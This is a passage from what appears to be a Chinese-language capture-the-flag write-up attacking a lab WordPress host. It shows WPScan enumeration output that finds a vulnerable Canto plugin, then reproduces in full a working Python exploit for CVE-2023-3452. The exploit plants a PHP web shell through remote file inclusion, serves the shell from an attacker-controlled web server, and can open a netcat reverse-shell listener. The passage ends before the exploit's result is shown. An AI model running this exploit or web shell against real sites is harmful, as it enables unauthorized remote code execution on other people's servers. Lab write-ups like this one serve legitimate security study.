operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">400</span> / <span class="token number">400</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:04
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking Theme Versions <span class="token punctuation">(</span>via Aggressive Methods<span class="token punctuation">)</span>

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Theme<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> twentytwentyfour
 <span class="token operator">|</span> Location: http://192.168.56.181/wp-content/themes/twentytwentyfour/
 <span class="token operator">|</span> Latest Version: <span class="token number">1.1</span>
 <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-04-02T00:00:00.000Z
 <span class="token operator">|</span> Readme: http://192.168.56.181/wp-content/themes/twentytwentyfour/readme.txt
 <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Directory listing is enabled
 <span class="token operator">|</span> Style URL: http://192.168.56.181/wp-content/themes/twentytwentyfour/style.css
 <span class="token operator">|</span> Style Name: Twenty Twenty-Four
 <span class="token operator">|</span> Style URI: https://wordpress.org/themes/twentytwentyfour/
 <span class="token operator">|</span> Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti<span class="token punctuation">..</span>.
 <span class="token operator">|</span> Author: the WordPress team
 <span class="token operator">|</span> Author URI: https://wordpress.org
 <span class="token operator">|</span>
 <span class="token operator">|</span> Found By: Known Locations <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  - http://192.168.56.181/wp-content/themes/twentytwentyfour/, status: <span class="token number">200</span>
 <span class="token operator">|</span>
 <span class="token operator">|</span> The version could not be determined.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> twentytwentythree
 <span class="token operator">|</span> Location: http://192.168.56.181/wp-content/themes/twentytwentythree/
 <span class="token operator">|</span> Latest Version: <span class="token number">1.4</span>
 <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-04-02T00:00:00.000Z
 <span class="token operator">|</span> Readme: http://192.168.56.181/wp-content/themes/twentytwentythree/readme.txt
 <span class="token operator">|</span> <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Directory listing is enabled
 <span class="token operator">|</span> Style URL: http://192.168.56.181/wp-content/themes/twentytwentythree/style.css
 <span class="token operator">|</span> Style Name: Twenty Twenty-Three
 <span class="token operator">|</span> Style URI: https://wordpress.org/themes/twentytwentythree
 <span class="token operator">|</span> Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced <span class="token keyword">in</span> WordPress <span class="token number">6</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
 <span class="token operator">|</span> Author: the WordPress team
 <span class="token operator">|</span> Author URI: https://wordpress.org
 <span class="token operator">|</span>
 <span class="token operator">|</span> Found By: Known Locations <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  - http://192.168.56.181/wp-content/themes/twentytwentythree/, status: <span class="token number">200</span>
 <span class="token operator">|</span>
 <span class="token operator">|</span> The version could not be determined.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> twentytwentytwo
 <span class="token operator">|</span> Location: http://192.168.56.181/wp-content/themes/twentytwentytwo/
 <span class="token operator">|</span> Latest Version: <span class="token number">1.7</span>
 <span class="token operator">|</span> Last Updated: <span class="token number">2024</span>-04-02T00:00:00.000Z
 <span class="token operator">|</span> Readme: http://192.168.56.181/wp-content/themes/twentytwentytwo/readme.txt
 <span class="token operator">|</span> Style URL: http://192.168.56.181/wp-content/themes/twentytwentytwo/style.css
 <span class="token operator">|</span> Style Name: Twenty Twenty-Two
 <span class="token operator">|</span> Style URI: https://wordpress.org/themes/twentytwentytwo/
 <span class="token operator">|</span> Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a<span class="token punctuation">..</span>.
 <span class="token operator">|</span> Author: the WordPress team
 <span class="token operator">|</span> Author URI: https://wordpress.org/
 <span class="token operator">|</span>
 <span class="token operator">|</span> Found By: Known Locations <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  - http://192.168.56.181/wp-content/themes/twentytwentytwo/, status: <span class="token number">200</span>
 <span class="token operator">|</span>
 <span class="token operator">|</span> The version could not be determined.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK
 <span class="token operator">|</span> Plan: <span class="token function">free</span>
 <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">3</span>
 <span class="token operator">|</span> Requests Remaining: <span class="token number">17</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Wed Jun  <span class="token number">5</span> <span class="token number">15</span>:58:22 <span class="token number">2024</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">419</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">38</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">112.38</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">75.975</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">168.949</span> MB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:00:16</code></pre>
<p>没什么有用信息<br>扫一下插件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># wpscan --url http://192.168.56.181 -e p --detection-mode aggressive --api-token ************************</span>

_______________________________________________________________
         __          _______   _____
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.181/ [192.168.56.181]
[+] Started: Wed Jun  5 15:59:26 2024

Interesting Finding(s):

[+] XML-RPC seems to be enabled: http://192.168.56.181/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.181/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.181/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.181/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Latest, released on 2024-05-07).
 | Found By: Atom Generator (Aggressive Detection)
 |  - http://192.168.56.181/index.php/feed/atom/, &lt;generator uri="https://wordpress.org/" version="6.5.3">WordPress&lt;/generator>
 | Confirmed By: Style Etag (Aggressive Detection)
 |  - http://192.168.56.181/wp-admin/load-styles.php, Match: '</span><span class="token number">6.5</span>.3'

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> The main theme could not be detected.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Most Popular Plugins <span class="token punctuation">(</span>via Passive Methods<span class="token punctuation">)</span>

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> No plugins Found.

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK
 <span class="token operator">|</span> Plan: <span class="token function">free</span>
 <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">0</span>
 <span class="token operator">|</span> Requests Remaining: <span class="token number">17</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Wed Jun  <span class="token number">5</span> <span class="token number">15</span>:59:30 <span class="token number">2024</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">4</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">34</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">1.096</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">2.648</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">222.695</span> MB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:00:03</code></pre>
<p>没有扫到插件，很难搞，我就在想大概率是用wpscan解决不了，虽然目录开放了，但是太多目录了不太可能一个个看<br>后来知道，参数给错了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">
-e, <span class="token parameter variable">--enumerate</span> <span class="token punctuation">[</span>OPTS<span class="token punctuation">]</span>
       Enumeration Process Available Choices:

       vp Vulnerable plugins

       ap All plugins

       p Plugins

       vt Vulnerable themes

       at All themes

       t Themes

       tt Timthumbs

       cb Config backups

       dbe Db exports

       u User IDs range. e.g: u1-5 Range separator to use: <span class="token string">'-'</span> Value <span class="token keyword">if</span> no argument supplied: <span class="token number">1</span>-10

       m Media IDs range. e.g m1-15 Note: Permalink setting must be <span class="token builtin class-name">set</span> to <span class="token string">"Plain"</span> <span class="token keyword">for</span> those to be detected Range separator to use: <span class="token string">'-'</span> Value <span class="token keyword">if</span> no argument supplied: <span class="token number">1</span>-100

       Separator to use between the values: <span class="token string">','</span> Default: All Plugins, Config Backups Value <span class="token keyword">if</span> no argument supplied: vp,vt,tt,cb,dbe,u,m Incompatible choices <span class="token punctuation">(</span>only one of each group/s can be used<span class="token punctuation">)</span>:

       - vp, ap, p - vt, at, t

--exclude-content-based REGEXP_OR_STRING
       Exclude all responses matching the Regexp <span class="token punctuation">(</span>case insensitive<span class="token punctuation">)</span> during parts of the enumeration.  Both the headers and body are checked. Regexp delimiters are not required.

--plugins-detection MODE
       Use the supplied mode to enumerate Plugins, instead of the global <span class="token punctuation">(</span>--detection-mode<span class="token punctuation">)</span> mode.  Default: passive Available choices: mixed, passive, aggressive
</code></pre>
<p>使用ap 以及–plugins-detection aggressive可以扫出来这个插件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># wpscan --url http://192.168.56.181 -e ap  --plugins-detection  aggressive --api-token **********************</span>

_______________________________________________________________
         __          _______   _____
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.181/ [192.168.56.181]
[+] Started: Wed Jun  5 16:33:51 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.56.181/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.56.181/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.56.181/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.56.181/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5.3 identified (Latest, released on 2024-05-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.56.181/index.php/feed/, &lt;generator>https://wordpress.org/?v=6.5.3&lt;/generator>
 |  - http://192.168.56.181/index.php/comments/feed/, &lt;generator>https://wordpress.org/?v=6.5.3&lt;/generator>

[+] WordPress theme in use: twentytwentyfour
 | Location: http://192.168.56.181/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.1 (up to date)
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://192.168.56.181/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://192.168.56.181/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.56.181/wp-content/themes/twentytwentyfour/style.css, Match: '</span>Version: <span class="token number">1.1</span><span class="token string">'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:03:19 &lt;===================================================================================================================================================> (105749 / 105749) 100.00% Time: 00:03:19
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.56.181/wp-content/plugins/akismet/
 | Latest Version: 5.3.2 (up to date)
 | Last Updated: 2024-05-31T16:57:00.000Z
 | Readme: http://192.168.56.181/wp-content/plugins/akismet/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.56.181/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.181/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.56.181/wp-content/plugins/akismet/readme.txt

[+] canto
 | Location: http://192.168.56.181/wp-content/plugins/canto/
 | Last Updated: 2024-05-13T08:21:00.000Z
 | Readme: http://192.168.56.181/wp-content/plugins/canto/readme.txt
 | [!] The version is out of date, the latest version is 3.0.8
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.56.181/wp-content/plugins/canto/, status: 200
 |
 | [!] 3 vulnerabilities identified:
 |
 | [!] Title: Canto &lt;= 3.0.8 - Unauthenticated Blind SSRF
 |     References:
 |      - https://wpscan.com/vulnerability/29c89cc9-ad9f-4086-a762-8896eba031c6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28976
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28977
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28978
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24063
 |      - https://gist.github.com/p4nk4jv/87aebd999ce4b28063943480e95fd9e0
 |
 | [!] Title: Canto &lt; 3.0.5 - Unauthenticated Remote File Inclusion
 |     Fixed in: 3.0.5
 |     References:
 |      - https://wpscan.com/vulnerability/9e2817c7-d4aa-4ed9-a3d7-18f3117ed810
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3452
 |
 | [!] Title: Canto &lt; 3.0.7 - Unauthenticated RCE
 |     Fixed in: 3.0.7
 |     References:
 |      - https://wpscan.com/vulnerability/1595af73-6f97-4bc9-9cb2-14a55daaa2d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25096
 |      - https://patchstack.com/database/vulnerability/canto/wordpress-canto-plugin-3-0-6-unauthenticated-remote-code-execution-rce-vulnerability
 |
 | Version: 3.0.4 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.56.181/wp-content/plugins/canto/readme.txt
 | Confirmed By: Composer File (Aggressive Detection)
 |  - http://192.168.56.181/wp-content/plugins/canto/package.json, Match: '</span><span class="token number">3.0</span>.4'

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> WPScan DB API OK
 <span class="token operator">|</span> Plan: <span class="token function">free</span>
 <span class="token operator">|</span> Requests Done <span class="token punctuation">(</span>during the scan<span class="token punctuation">)</span>: <span class="token number">1</span>
 <span class="token operator">|</span> Requests Remaining: <span class="token number">13</span>

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Wed Jun  <span class="token number">5</span> <span class="token number">16</span>:37:24 <span class="token number">2024</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">105759</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">46</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">28.697</span> MB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">14.149</span> MB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Memory used: <span class="token number">451.961</span> MB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Elapsed time: 00:03:33</code></pre>
<p>(当然这是后话)</p>
<p>我就尝试搜了一下Canto的的漏洞发现一个cve <code>CVE-2023-3452</code><br><img src="https://ooo.0x0.ooo/2024/06/05/OJsQMC.png" alt="OJsQMC.png" loading="lazy"><br><a href="https://github.com/leoanggal1/CVE-2023-3452-PoC/blob/main/CVE-2023-3452.py">https://github.com/leoanggal1/CVE-2023-3452-PoC/blob/main/CVE-2023-3452.py</a><br>试了一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Exploit Title: Wordpress Plugin Canto &lt; 3.0.5 - Remote File Inclusion (RFI) and Remote Code Execution (RCE)</span>
<span class="token comment"># Date: 04/11/2023</span>
<span class="token comment"># Exploit Author: Leopoldo Angulo (leoanggal1)</span>
<span class="token comment"># Vendor Homepage: https://wordpress.org/plugins/canto/</span>
<span class="token comment"># Software Link: https://downloads.wordpress.org/plugin/canto.3.0.4.zip</span>
<span class="token comment"># Version: All versions of Canto Plugin prior to 3.0.5</span>
<span class="token comment"># Tested on: Ubuntu 22.04, Wordpress 6.3.2, Canto Plugin 3.0.4</span>
<span class="token comment"># CVE : CVE-2023-3452</span>

<span class="token comment">#PoC Notes:</span>
<span class="token comment">#The Canto plugin for WordPress is vulnerable to Remote File Inclusion in versions up to, and including, 3.0.4 via the 'wp_abspath' parameter. This allows unauthenticated attackers to include and execute arbitrary remote code on the server, provided that allow_url_include is enabled. (Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-3452)</span>
<span class="token comment">#This code exploits the improper handling of the wp_abspath variable in the following line of the "download.php" code:</span>
<span class="token comment">#... require_once($_REQUEST['wp_abspath'] . '/wp-admin/admin.php'); ...</span>
<span class="token comment">#This is just an example but there is this same misconfiguration in other lines of the vulnerable plugin files.</span>
<span class="token comment"># More information in Leoanggal1's Github</span>

<span class="token comment">#!/usr/bin/python3</span>
<span class="token function">import</span> argparse
<span class="token function">import</span> http.server
<span class="token function">import</span> socketserver
<span class="token function">import</span> threading
<span class="token function">import</span> requests
<span class="token function">import</span> os
<span class="token function">import</span> subprocess

<span class="token comment"># Define the default web shell</span>
default_web_shell <span class="token operator">=</span> <span class="token string">"&lt;?php system(<span class="token variable">$_GET</span>['cmd']); ?>"</span>

def create_admin_file<span class="token punctuation">(</span>local_dir, <span class="token assign-left variable">local_shell</span><span class="token operator">=</span>None<span class="token punctuation">)</span>:
    <span class="token keyword">if</span> not os.path.exists<span class="token punctuation">(</span>local_dir<span class="token punctuation">)</span>:
        os.makedirs<span class="token punctuation">(</span>local_dir<span class="token punctuation">)</span>

    <span class="token comment"># If a local shell is provided, use it; otherwise, use the default web shell</span>
    <span class="token keyword">if</span> local_shell:
        with open<span class="token punctuation">(</span>f<span class="token string">"&#123;local_dir&#125;/admin.php"</span>, <span class="token string">"wb"</span><span class="token punctuation">)</span> as admin_file:
            with open<span class="token punctuation">(</span>local_shell, <span class="token string">"rb"</span><span class="token punctuation">)</span> as original_file:
                admin_file.write<span class="token punctuation">(</span>original_file.read<span class="token punctuation">(</span><span class="token punctuation">))</span>
    else:
        with open<span class="token punctuation">(</span>f<span class="token string">"&#123;local_dir&#125;/admin.php"</span>, <span class="token string">"w"</span><span class="token punctuation">)</span> as admin_file:
            admin_file.write<span class="token punctuation">(</span>default_web_shell<span class="token punctuation">)</span>

def start_local_server<span class="token punctuation">(</span>local_port<span class="token punctuation">)</span>:
    Handler <span class="token operator">=</span> http.server.SimpleHTTPRequestHandler
    httpd <span class="token operator">=</span> socketserver.TCPServer<span class="token variable"><span class="token punctuation">((</span>"<span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.0</span>"<span class="token punctuation">,</span> local_port<span class="token punctuation">)</span><span class="token punctuation">,</span> Handler<span class="token punctuation">)</span>

    print<span class="token punctuation">(</span>f"Local web server on port &#123;local_port&#125;..."<span class="token punctuation">)</span>
    httpd.serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>

    return httpd

def exploit_rfi<span class="token punctuation">(</span>url<span class="token punctuation">,</span> local_shell<span class="token punctuation">,</span> local_host<span class="token punctuation">,</span> local_port<span class="token punctuation">,</span> command<span class="token punctuation">,</span> nc_port<span class="token punctuation">)</span><span class="token operator">:</span>
    local_dir <span class="token operator">=</span> "wp<span class="token operator">-</span>admin"
    create_admin_file<span class="token punctuation">(</span>local_dir<span class="token punctuation">,</span> local_shell<span class="token punctuation">)</span>

    target_url <span class="token operator">=</span> f"&#123;url&#125;<span class="token operator">/</span>wp<span class="token operator">-</span>content<span class="token operator">/</span>plugins<span class="token operator">/</span>canto<span class="token operator">/</span>includes<span class="token operator">/</span>lib<span class="token operator">/</span>download.php"
    local_server <span class="token operator">=</span> f"http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>&#123;local_host&#125;<span class="token operator">:</span>&#123;local_port&#125;"
    command <span class="token operator">=</span> f"cmd<span class="token operator">=</span>&#123;command&#125;"

    if local_shell<span class="token operator">:</span>
        # If a local shell is provided<span class="token punctuation">,</span> start netcat on the specified port
        subprocess.Popen<span class="token punctuation">(</span>["nc"<span class="token punctuation">,</span> "<span class="token operator">-</span>lvp"<span class="token punctuation">,</span> str<span class="token punctuation">(</span>nc_port<span class="token punctuation">)</span>]<span class="token punctuation">)</span>

    server_thread <span class="token operator">=</span> threading.Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>start_local_server<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>local_port<span class="token punctuation">,</span><span class="token punctuation">))</span></span>
    server_thread.daemon <span class="token operator">=</span> True
    server_thread.start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    exploit_url <span class="token operator">=</span> f<span class="token string">"&#123;target_url&#125;?wp_abspath=&#123;local_server&#125;&amp;&#123;command&#125;"</span>
    print<span class="token punctuation">(</span>f<span class="token string">"Exploitation URL: &#123;exploit_url&#125;"</span><span class="token punctuation">)</span>

    response <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>exploit_url<span class="token punctuation">)</span>
    print<span class="token punctuation">(</span><span class="token string">"Server response:"</span><span class="token punctuation">)</span>
    print<span class="token punctuation">(</span>response.text<span class="token punctuation">)</span>

    <span class="token comment"># Shutdown the local web server</span>
    print<span class="token punctuation">(</span><span class="token string">"Shutting down local web server..."</span><span class="token punctuation">)</span>
    server_thread.join<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token builtin class-name">:</span>
    examples <span class="token operator">=</span> <span class="token string">''</span>'
    Examples:
    - Check the vulnerability
    python3 CVE-2023-3452.py <span class="token parameter variable">-u</span> http://192.168.1.142 <span class="token parameter variable">-LHOST</span> <span class="token number">192.168</span>.1.33

    - Execute a <span class="token builtin class-name">command</span>
    python3 CVE-2023-3452.py <span class="token parameter variable">-u</span> http://192.168.1.142 <span class="token parameter variable">-LHOST</span> <span class="token number">192.168</span>.1.33 <span class="token parameter variable">-c</span> <span class="token string">'id'</span>

    - Upload and run a reverse shell file. You can download it from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php or generate it with msfvenom.
    python3 CVE-2023-3452.py <span class="token parameter variable">-u</span> http://192.168.1.142 <span class="token parameter variable">-LHOST</span> <span class="token number">192.168</span>.1.33 <span class="token parameter variable">-NC_PORT</span> <span class="token number">3333</span> <span class="token parameter variable">-s</span> php-reverse-shell.php
    <span class="token string">''</span>'
    parser <span class="token operator">=</span> argparse.ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"Script to exploit the Remote File Inclusion vulnerability in the Canto plugin for WordPress - CVE-2023-3452"</span>, <span class="token assign-left variable">epilog</span><span class="token operator">=</span>examples, <span class="token assign-left variable">formatter_class</span><span class="token operator">=</span>argparse.RawDescriptionHelpFormatter<span class="token punctuation">)</span>
    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-u"</span>, <span class="token string">"--url"</span>, <span class="token assign-left variable">required</span><span class="token operator">=</span>True, <span class="token assign-left variable">default</span><span class="token operator">=</span>None,  <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Vulnerable URL"</span><span class="token punctuation">)</span>
    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-s"</span>, <span class="token string">"--shell"</span>, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Local file for web shell"</span><span class="token punctuation">)</span>
    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-LHOST"</span>, <span class="token string">"--local_host"</span>, <span class="token assign-left variable">required</span><span class="token operator">=</span>True, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Local web server IP"</span><span class="token punctuation">)</span>
    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-LPORT"</span>, <span class="token string">"--local_port"</span>, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Local web server port"</span><span class="token punctuation">)</span>
    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-c"</span>, <span class="token string">"--command"</span>, <span class="token assign-left variable">default</span><span class="token operator">=</span><span class="token string">"whoami"</span>, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Command to execute on the target"</span><span class="token punctuation">)</span>
    parser.add_argument<span class="token punctuation">(</span><span class="token string">"-NC_PORT"</span>, <span class="token string">"--nc_port"</span>, <span class="token assign-left variable">type</span><span class="token operator">=</span>int, <span class="token assign-left variable">help</span><span class="token operator">=</span><span class="token string">"Listener port for netcat"</span><span class="token punctuation">)</span>

    try:
        args <span class="token operator">=</span> parser.parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> args.local_port is None:
            args.local_port <span class="token operator">=</span> <span class="token number">8080</span>  <span class="token comment"># Valor predeterminado si LPORT no se proporciona</span>
        exploit_rfi<span class="token punctuation">(</span>args.url, args.shell, args.local_host, int<span class="token punctuation">(</span>args.local_port<span class="token punctuation">)</span>, args.command, args.nc_port<span class="token punctuation">)</span>

    except SystemExit:
        parser.print_help<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>检测一下</p>
